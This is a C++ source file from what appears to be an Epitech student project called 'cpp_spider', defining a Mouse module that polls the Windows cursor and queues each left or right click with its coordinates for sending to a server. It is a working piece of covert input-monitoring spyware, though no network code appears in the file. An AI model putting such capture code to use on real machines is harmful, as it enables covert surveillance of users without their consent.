/*
** Mouse.cpp for Client in /Users/gmblucas/Desktop/Shared/Epitech/cpp_spider/Client/Sources/Modules
**
** Made by Lucas Gambini
** Login   <gmblucas@epitech.net>
**
** Started on  Wed Sep 27 19:41:55 2017 Lucas Gambini
** Last update Sat Sep 30 22:55:33 2017 Lucas Gambini
*/

#include "Mouse.hpp"
#include <boost/lexical_cast.hpp>

Mouse::Mouse(std::deque<std::pair<Request, std::string>> &sendingQueue) : _sendingQueue(sendingQueue) {

}

Mouse::~Mouse() {
}

Mouse &Mouse::operator=(const Mouse &obj) {
    this->_status = obj._status;
	this->_sendingQueue = obj._sendingQueue;
    return (*this);
}

Mouse::Mouse(const Mouse &obj) : _sendingQueue(obj._sendingQueue) {
    this->_status = obj._status;
}

void Mouse::update() {
    POINT p;
	std::string pos;
    while (this->_status == RUNNING) {
        if (!GetCursorPos(&p))
            return;
        if (GetAsyncKeyState(VK_RBUTTON)) {
			pos = "right " + boost::lexical_cast<std::string>(p.x) + "|" + boost::lexical_cast<std::string>(p.y);
			this->_sendingQueue.push_front(std::make_pair(Request::MOUSEINFO, pos));
            Sleep(150);
		}
		else if (GetAsyncKeyState(VK_LBUTTON)) {
			pos = "left " + boost::lexical_cast<std::string>(p.x) + "|" + boost::lexical_cast<std::string>(p.y);
			this->_sendingQueue.push_front(std::make_pair(Request::MOUSEINFO, pos));
			Sleep(150);
		}
    }
}

void Mouse::setup() {
    this->_status = RUNNING;
    this->_thread = std::thread(&Mouse::update, this);
}
